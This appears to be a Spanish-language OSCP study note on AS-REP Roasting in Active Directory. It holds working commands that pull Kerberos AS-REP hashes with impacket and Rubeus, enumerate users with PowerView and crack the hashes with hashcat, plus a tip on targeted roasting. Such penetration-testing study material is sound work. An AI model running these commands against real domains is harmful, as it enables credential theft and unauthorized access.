---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, ad, explotacion, windows, linux]
---

# AS-REP Roasting

> [!abstract] Qué es y cuándo usarla
> Si un usuario tiene **"Do not require Kerberos preauthentication"** activado, cualquiera puede pedir su **AS-REP** al DC y crackear offline la parte cifrada (= su password). No necesitas más que conectividad al DC y, para enumerar candidatos, un usuario del dominio.

## Requisitos previos
- Conectividad al DC (puerto 88). Para Rubeus, ejecutar como usuario de dominio.
- Usuarios con preauth deshabilitada (los identifican las propias herramientas).

## Pasos
```bash
# Linux (impacket)
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asrep corp.com/pete
# sin -request/-outputfile: solo lista usuarios vulnerables
sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
```powershell
# Windows (Rubeus) - como usuario de dominio ya autenticado
.\Rubeus.exe asreproast /nowrap
# identificar candidatos con PowerView:
Get-DomainUser -PreauthNotRequired
```
Hashcat mode **18200** (Kerberos 5 etype 23, AS-REP).

> [!tip] **Targeted AS-REP Roasting**: con `GenericWrite`/`GenericAll` sobre un user puedes activarle "no preauth", roastearlo y **revertir** el flag después (sin resetear su password).

> [!warning] Detección / problemas
> - Es offline → no bloquea cuentas, pero pedir AS-REP masivos genera eventos en el DC.
> - `/nowrap` evita saltos de línea que rompen el hash al copiarlo.

## Visto en
- Módulo: [[23 - Attacking Active Directory Authentication]]
- Máquinas: [[]]
